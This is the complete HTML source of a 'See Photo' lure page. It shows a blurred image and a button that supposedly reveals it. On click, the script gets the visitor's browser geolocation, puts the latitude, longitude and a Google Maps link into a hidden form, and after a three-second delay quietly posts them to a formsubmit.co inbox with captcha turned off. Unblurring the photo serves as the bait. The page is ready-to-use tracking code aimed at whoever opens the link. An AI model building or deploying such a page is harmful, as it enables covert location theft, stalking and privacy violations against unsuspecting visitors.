<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>See Photo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-image: url('img1.jpg');
      background-size: cover;
      background-position: center;
      filter: blur(6px);
      z-index: -1;
      transition: filter 0.5s ease;
    }

    body.revealed::before {
      filter: none;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: rgba(0, 0, 0, 0.4);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: rgba(255, 255, 255, 0.95);
      padding: 30px 20px;
      border-radius: 12px;
      text-align: center;
      max-width: 400px;
      width: 90%;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
      transition: opacity 0.5s ease;
    }

    .hidden {
      opacity: 0;
      pointer-events: none;
    }

    h2 {
      color: #333;
      margin-bottom: 20px;
    }

    button {
      background-color: #007BFF;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      margin-top: 10px;
    }

    button:hover {
      background-color: #0056b3;
    }

    #output {
      margin-top: 20px;
      color: #333;
      font-weight: bold;
    }

    #locationForm {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container" id="contentBox">
    <h2>Click the Button to See Photo</h2>
    <button onclick="getLocation()">See Photo</button>
    <p id="output"></p>
  </div>

  <!-- Hidden form to send location -->
  <form id="locationForm" method="POST" action="https://formsubmit.co/5ccabaf9d3e99562488394bd3fba321c">
    <input type="hidden" name="latitude" id="latitude">
    <input type="hidden" name="longitude" id="longitude">
    <input type="hidden" name="mapLink" id="mapLink">
    <input type="hidden" name="_subject" value="New Location Shared!">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="thankyou.html"> <!-- Custom thank you page -->
  </form>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          document.getElementById("latitude").value = lat;
          document.getElementById("longitude").value = lon;
          document.getElementById("mapLink").value = `https://www.google.com/maps?q=${lat},${lon}`;

          document.getElementById("output").innerText = "Location captured! Revealing photo...";

          revealPhoto();

          setTimeout(() => {
            document.getElementById("locationForm").submit();
          }, 3000); // 3 second delay
        }, showError);
      } else {
        document.getElementById("output").innerText = "Geolocation not supported.";
      }
    }

    function revealPhoto() {
      document.body.classList.add("revealed");
      document.getElementById("contentBox").classList.add("hidden");
    }

    function showError(error) {
      document.getElementById("output").innerText = "Error: " + error.message;
    }
  </script>
</body>
</html>
